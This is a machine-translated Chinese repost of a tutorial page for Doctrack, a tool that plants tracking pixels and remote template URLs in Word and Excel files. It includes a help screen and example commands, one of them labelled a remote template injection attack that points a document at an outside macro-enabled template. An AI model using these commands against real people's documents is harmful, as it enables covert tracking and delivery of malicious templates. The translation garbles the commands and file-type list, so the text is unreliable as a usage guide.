# doctrack——在 Office Open XML 文档中操作和插入跟踪像素的工具

> 原文：<https://kalilinuxtutorials.com/doctrack/>

[![Doctrack – Tool To Manipulate & Insert Tracking Pixels Into Office Open XML Documents](img/348308fa2ff69566127f3798a6ea7342.png "Doctrack – Tool To Manipulate & Insert Tracking Pixels Into Office Open XML Documents")](https://1.bp.blogspot.com/-PuYBqBBzvKg/X7gbk2bWdTI/AAAAAAAAIDo/PZ1NUFY2AbAMPLVKy7rh14QobkKlrmHuwCLcBGAsYHQ/s728/Doctrack%25281%2529.png)

**Doctrack** 是一个在 Office Open XML 文档中操作和插入跟踪像素的工具。

**特性**

*   将跟踪像素插入 Office Open XML 文档(Word 和 Excel)
*   用于远程模板注入攻击的注入模板 URL
*   检查外部目标 URL 和元数据
*   创建 Office Open XML 文档(#TODO)

**安装**

您需要下载[。适用于您平台的 Net Core SDK](https://dotnet.microsoft.com/download/) 。然后，在 Windows 上构建单个二进制文件:

**$ git 克隆 https://github.com/wavvs/doctrack.git
$ CD doctrack/
$ dot net publish-r win-x64-c Release/p:publish single file = true**

*   **在 Linux 上:**

**$ dot net publish-r Linux-x64-c Release/p:publish single file = true**

**用途**

**$ doc track–help**
工具操纵跟踪像素并将其插入到 Office Open XML 文档中。
**版权所有(C) 2020 doctrack**

-i，–Input 输入文件名。
-o，–输出输出文件名。
-m，–要提供的元数据元数据(json 文件)
-u，–要插入的 url URL。
-e，–template(默认值:false)如果设置，则启用模板 URL 注入。
-t，–type 文档类型。如果未指定–input，则创建新的
文档并保存为–output。
-l，–list-types(默认值:false)列出可用于创建文档
的类型。
-s，–Inspect(默认值:false)检查外部目标。
–帮助显示该帮助屏幕。

下面列出了可用的文档类型。如果您要插入跟踪 URL，只需使用文档或工作簿类型，此处列出的其他类型仅用于文档创建(#TODO)。

**美元 doc track–list 类型**
文件(*。docx)*
*【宏启用文档】*。docm)
宏观可启用的替代物(*。dotm)*
*模板(*。dotx)
工作簿〔t15〕。xlsx)
*【巨启用工作簿】*。xlsm)
宏观可启用性的示范性 teX ( *。xltm)*
*【templatex】*。xltx)

插入跟踪像素并更改文档元数据:

**$ doc track-t Document-I test . docx-o test . docx–metadata metadata . JSON–URL http://test.url/image.png**

插入远程模板 URL(远程模板注入攻击)，仅适用于 Word 文档:

**$ doc track-t Document-I test . docx-o test . docx–URL http://test.url/template.dotm–模板**

检查外部目标 URL 和元数据:

$ doc track-t Document-I test . docx–inspect
【外部目标】
Part: /word/document.xml，ID: R8783bc77406d476d，http://test.url/image.png URI
Part:/word/settings . XML，ID: R33c36bdf400b44f6，URI:http://test.url/template.dotm
【元数据】
创建人:
标题:
主题:
类别:
关键字:
描述:
内容

[**Download**](https://github.com/wavvs/doctrack)